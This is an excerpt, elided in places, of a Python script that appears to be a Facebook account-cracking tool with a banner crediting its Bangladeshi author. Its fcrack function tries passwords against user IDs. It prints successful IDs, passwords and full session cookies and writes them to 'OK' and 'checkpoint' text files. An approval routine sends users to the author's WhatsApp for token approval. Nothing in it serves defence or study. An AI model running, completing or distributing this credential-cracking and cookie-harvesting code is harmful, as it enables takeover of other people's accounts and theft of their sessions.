...
\033[1;32m SORDAR\033[1;37m 
--------------------------------------------------
[•]CREATED BY     : \033[1;32mSAJJAD-SORDAR\033[1;37m
[•]FACEBOOK       : \033[1;32mSajjad Sordar\033[1;37m
[•]FROM        : \033[1;32mBANGLADESH\033[1;37m
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Sajjadsordar-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('Sajjadsordar-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[Sajjadsordar-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Sajjadsordar-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSajjadsordar\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+880 1401580673?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
